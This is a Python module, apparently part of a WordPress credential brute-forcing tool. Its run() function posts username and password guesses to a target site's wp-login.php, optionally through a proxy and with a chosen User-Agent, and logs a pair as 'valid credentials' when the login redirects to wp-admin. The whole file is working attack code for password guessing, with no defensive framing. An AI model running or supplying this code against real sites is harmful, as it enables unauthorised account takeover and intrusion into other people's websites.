import requests
import threading
from lib.log import MyLogger

threadingLock = threading.Lock()
def run(items):
    url,user_agent,proxy,username, password=items
    url=url.strip("/")
    redirecto=url+"/wp-admin/"
    url=url+'/wp-login.php'
    header = {'User-Agent': user_agent}
    data={'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': redirecto}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(url, headers=header, data=data, proxies=proxies, timeout=5)
    else:
        response = requests.post(url,headers=header, data=data,timeout=5)
    threadingLock.acquire()
    print(u'\r[#] 正在尝试凭据：'+username+"    "+password+' '*10,end='')
    # MyLogger.debug("正在尝试凭据："+username+" "+password)
    if response.status_code==200:
        if 'wp-admin' in response.url:
            MyLogger.success("有效凭据："+username+" "+password)
            threadingLock.release()
            return {username:password}
        else:
            print(u'\r[#] 无效凭据：' + username + "    " + password+' '*10, end='')
            # MyLogger.debug("无效凭据："+username+" "+password)
            threadingLock.release()
    else:
        threadingLock.release()
